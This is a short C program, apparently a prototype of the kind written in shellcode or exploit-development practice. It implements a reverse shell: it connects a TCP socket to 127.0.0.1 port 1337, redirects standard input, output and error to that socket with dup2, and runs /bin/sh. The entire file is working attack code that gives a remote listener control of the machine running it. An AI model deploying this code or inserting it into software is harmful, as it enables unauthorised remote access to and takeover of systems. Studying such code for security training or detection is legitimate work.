#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <fcntl.h>  /* for O_RDONLY flag. */
#include <stdint.h> /* for int32_t, int16_t types. */

int main(int argc, char *argv[])
{    
    int sockfd = -1;
    int connfd = -1;
    struct sockaddr_in s_address; 
    socklen_t addrsize = sizeof(struct sockaddr_in );
    
    // socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0); 
    
    // connect
    memset(&s_address, 0, addrsize);
    s_address.sin_family = AF_INET;
    s_address.sin_port = htons(1337); 
    inet_pton(AF_INET, "127.0.0.1", &s_address.sin_addr);
    connfd = connect(sockfd, (struct sockaddr*) &s_address, addrsize); 
    
    // dup2
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    
    // execv
    execv("/bin/sh", NULL);

    exit(0);
}
